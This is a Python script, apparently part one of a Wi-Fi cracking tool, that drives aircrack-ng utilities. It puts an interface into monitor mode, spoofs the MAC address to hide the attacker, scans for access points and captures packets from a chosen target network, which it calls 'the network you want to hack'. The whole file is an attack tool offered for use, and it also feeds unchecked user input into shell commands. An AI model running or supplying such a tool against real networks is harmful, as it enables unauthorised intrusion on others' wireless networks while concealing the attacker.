import os, sys, time

print("--------------")
print("Opening Airmon")
print("--------------")

os.system("airmon-ng")
network_interface = input("Enter your network interface: ")

# We need to set the network interface to moniter mode to capture packets
cmd = "airmon-ng start %s" %network_interface
os.system(cmd)

print("----------------------")
print("Killing some processes")
print("----------------------")
os.system("airmon-ng check kill")

print("---------------------------------------")
print("Changing the Mac address for our safety")
print("---------------------------------------")
os.system("ifconfig wlan0mon down") # We have to turn off our interface
os.system("macchanger -a wlan0mon") # This will generate a random mac address
os.system("ifconfig wlan0mon up") # We have to turn it back on

print("------------------------------------------------------")
print("Searching for all the Wifi acces points in the region")
print("Press CTL C when the network you want to crack appears")
print("------------------------------------------------------")
mon_network_interface = network_interface + "mon"
os.system("airodump-ng %s" %mon_network_interface)

bssid = input("Enter the BSSID of the network you want to hack: ")
name = input("Enter the ESSID/name of the network you have chosen: ")
channel = input("Enter the channel on which the network is listening: ")

print("---------------------------------------------------------------------------------------")
print("Capturing packets")
print("The column STATION shows us the connected devices, the column DATA shows us the packets")
print("Open a new terminal and start part 2")
print("---------------------------------------------------------------------------------------")
cmd = "airodump-ng --bssid %s -w %s -c %s %s" %(bssid, name, channel, mon_network_interface)
print(cmd)
os.system(cmd)
